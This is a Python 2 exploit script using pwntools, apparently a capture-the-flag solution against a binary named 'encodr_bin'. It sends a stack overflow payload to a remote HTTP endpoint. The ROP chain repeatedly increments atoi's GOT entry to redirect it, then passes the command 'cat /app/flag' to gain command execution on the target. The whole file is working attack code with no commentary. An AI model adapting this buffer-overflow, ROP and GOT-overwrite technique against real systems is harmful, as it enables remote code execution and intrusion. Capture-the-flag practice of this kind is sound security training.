#!/usr/bin/env python2

from pwn import *
import requests

pop_ebx = 0x08048329 #: pop ebx; ret;
inc_ebx = 0x080488fa # add dword ptr [ebx], 3; add al, byte ptr [edx]; ret;

def payload1():
  payload = cyclic(0x108) + p32(0x1234) + p32(0x08048326) + p32(0) + "A"*8

  rop = ROP("./encodr_bin")

  rop.raw(pop_ebx)
  rop.raw(binary.got["atoi"])
  for _ in range(90):
    rop.raw(inc_ebx)

  rop.raw(pop_ebx)
  rop.raw(binary.got["atoi"]+1)

  for _ in range(0x4e):
    rop.raw(inc_ebx)

  rop.read(0, binary.got["atoi"], 1)
  rop.read(0, binary.bss(0x200), 50)
  rop.atoi(binary.bss(0x200))
  rop.exit(0)

  payload += str(rop)

  return payload

def payload2():
  payload = "\xe0"
  payload += "cat /app/flag\x00"
  return payload

def exploit():
  data = payload1()
  length = len(data)

  data += payload2()
  data = data.encode("hex")
  r = requests.post("http://gudluck.h4ve.fun:8002/api/encoder", json={"data": data, "length": length})

  json = r.json()
  print json["message"].decode("hex")


if __name__ == "__main__":
  name = "./encodr_bin"
  binary = ELF(name)
  context.arch = "i386"
  exploit()
